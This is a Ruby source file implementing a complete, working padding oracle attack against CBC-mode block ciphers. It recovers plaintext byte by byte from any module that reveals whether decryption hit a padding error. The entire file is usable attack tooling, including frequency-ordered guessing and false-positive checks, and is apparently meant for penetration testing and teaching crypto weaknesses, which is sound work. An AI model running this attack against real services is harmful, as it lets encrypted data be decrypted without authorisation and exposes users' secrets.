##
# Poracle.rb
# Created: December 8, 2012
# By: Ron Bowes
#
# This class implements a simple Padding Oracle attack. It requires a 'module',
# which implements a couple simple methods:
#
# NAME
#  A constant representing the name of the module, used for output.
#
# blocksize()
#  The blocksize of whatever cipher is being used, in bytes (eg, # 16 for AES,
#  8 for DES, etc)
#
# attempt_decrypt(ciphertext)
#  Attempt to decrypt the given data, and return true if there was no
#  padding error and false if a padding error occured.
#
# See LocalTestModule.rb and RemoteTestModule.rb for examples of how this can
# be made.
##
#

require 'hex'

module Poracle
  attr_accessor :verbose

  @@guesses = 0

  def Poracle.guesses
    return @@guesses
  end

  def Poracle.ord(c)
    if(c.is_a?(Fixnum))
      return c
    end
    return c.unpack('C')[0]
  end

  def Poracle.generate_set(base_list)
    mapping = []
    base_list.each do |i|
      mapping[ord(i)] = true
    end

    0.upto(255) do |i|
      if(!mapping[i])
        base_list << i.chr
      end
    end

    return base_list
  end

  def Poracle.find_character(mod, character, block, previous, plaintext, character_set, verbose = false)
    # First, generate a good C' (C prime) value, which is what we're going to
    # set the previous block to. It's the plaintext we have so far, XORed with
    # the expected padding, XORed with the previous block
    blockprime = "\0" * mod.blocksize
    (mod.blocksize - 1).step(character + 1, -1) do |i|
      blockprime[i] = (ord(plaintext[i]) ^ (mod.blocksize - character) ^ ord(previous[i])).chr
    end

    # Try all possible characters
    character_set.each do |current_guess|
      blockprime[character] = ((mod.blocksize - character) ^ ord(previous[character]) ^ ord(current_guess)).chr

      result = mod.attempt_decrypt(blockprime + block)
      @@guesses += 1

      if(result)
        # Validate the result if we're working on the last character
        false_positive = false
        if(character == mod.blocksize - 1)
          blockprime_test = blockprime.clone
          blockprime_test[character - 1] = (ord(blockprime_test[character - 1]) ^ 1).chr
          if(!mod.attempt_decrypt(blockprime_test + block))
            puts("Hit a false positive!")
            false_positive = true
          end
        end

        if(!false_positive)
          return current_guess
        end
      end
    end

    raise("Couldn't find a valid encoding!")
  end

  def Poracle.do_block(mod, block, previous, is_mostly_ascii = false, has_padding = false, verbose = false)
    result = "?" * block.length
    plaintext  = "?" * mod.blocksize

    # Loop through the string from the end to the beginning
    character = block.length - 1
    while(character >= 0) do
      # When character is below 0, we've arrived at the beginning of the string
      if(character >= block.length)
        raise("Could not decode!")
      end

      # Try to be intelligent about which character we guess first, to save
      # requests
      set = nil
      if(character == block.length - 1 && has_padding)
        set = generate_set([1.chr])
      elsif(has_padding && character >= block.length - plaintext[block.length - 1].ord)
        set = generate_set([plaintext[block.length - 1]])
      elsif(is_mostly_ascii)
        #set = generate_set(('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a + ' .,-!@#$%^&*()_+={[}]|\:;"\'<>?/]'.chars.to_a)
        # Generated based on the Battlestar Galactica wikia page (yes, I'm serious :) )
        set = generate_set(' eationsrlhdcumpfgybw.k:v-/,CT0SA;B#G2xI1PFWE)3(*M\'!LRDHN_"9UO54Vj87q$K6zJY%?Z+=@QX&|[]<>^{}'.chars.to_a)
      else
        set = generate_set([])
      end


      c = find_character(mod, character, block, previous, plaintext, set, verbose)
      plaintext[character] = c
      if(verbose)
        puts(plaintext)
      end
      character -= 1
    end

    return plaintext
  end

  def Poracle.decrypt(mod, data, iv = nil, verbose = false, is_mostly_ascii = false)
    # Default to a nil IV
    if(iv.nil?)
      iv = "\x00" * mod.blocksize
    end

    # Add the IV to the start of the encrypted string (for simplicity)
    data  = iv + data
    blockcount = data.length / mod.blocksize

    # Validate the blocksize
    if(data.length % mod.blocksize != 0)
      puts("Encrypted data isn't a multiple of the blocksize! Is this a block cipher?")
    end

    # Tell the user what's going on
    if(verbose)
      puts("> Starting Poracle decrypter with module #{mod.class::NAME}")
      puts(">> Encrypted length: %d" % data.length)
      puts(">> Blocksize: %d" % mod.blocksize)
      puts(">> %d blocks:" % blockcount)
    end

    # Split the data into blocks
    blocks = data.unpack("a#{mod.blocksize}" * blockcount)
    i = 0
    blocks.each do |b|
      i = i + 1
      if(verbose)
        puts(">>> Block #{i}: #{b.unpack("H*")}")
      end
    end

    # Decrypt all the blocks - from the last to the first (after the IV)
    result = ''
    is_last_block = true
    (blocks.size - 1).step(1, -1) do |i|
      new_result = do_block(mod, blocks[i], blocks[i - 1], is_mostly_ascii, is_last_block, verbose)
      if(new_result.nil?)
        return nil
      end
      is_last_block = false
      result = new_result + result
      if(verbose)
        puts(" --> #{result}")
      end
    end

    # Validate and remove the padding
    pad_bytes = result[result.length - 1].chr
    if(result[result.length - ord(pad_bytes), result.length - 1] != pad_bytes * ord(pad_bytes))
      puts("Bad padding:")
      puts(Hex.get_str(result))
      return nil
    end

    result = result[0, result.length - ord(pad_bytes)]

    return result
  end
end
